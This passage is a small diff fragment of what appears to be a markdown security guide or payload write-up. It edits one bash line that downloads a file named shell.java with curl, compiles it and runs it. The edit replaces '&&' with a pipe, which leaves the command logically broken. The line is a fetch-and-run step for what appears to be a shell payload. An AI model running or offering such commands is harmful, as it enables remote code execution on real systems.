@@ -252,7 +252,7 @@ end
 ```
 
 ```bash
-curl -s -o shell.java http://localhost/shell.java && javac shell.java && java shell
+curl -s -o shell.java http://localhost/shell.java && javac shell.java | java shell
 ```
 
 shell.java:
